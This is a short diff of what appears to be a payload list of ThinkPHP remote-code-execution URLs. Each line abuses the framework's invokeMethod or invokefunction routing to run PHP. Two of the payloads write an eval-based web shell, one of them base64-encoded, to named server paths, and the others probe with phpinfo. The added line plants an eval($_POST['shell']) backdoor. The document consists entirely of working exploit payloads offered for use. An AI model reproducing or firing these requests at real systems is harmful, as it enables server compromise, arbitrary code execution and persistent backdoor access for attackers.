@@ -1,3 +1,4 @@
 /index.php?s=/Index/think\app/invokeMethod&method[0]=think\view\driver\Php&method[1]=display&vars[0]=<?php%20call_user_func('assert','file_put_contents'.'("/www/wwwroot/index.333.ms/public/uploads/help.php",base64_decode'.'("PD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ3NoZWxsJ10pKTs="'.')'.')');?>
 /index.php?s=/Index/think\app/invokeMethod&method[0]=think\view\driver\Php&method[1]=display&vars[0]=<?php call_user_func('assert','phpinfo'.'('.')');?>
 /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
+/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=/www/wwwroot/gbk999.com/public/help.php&vars[1][1]=<?php @eval(base64_decode($_POST[%27shell%27]));
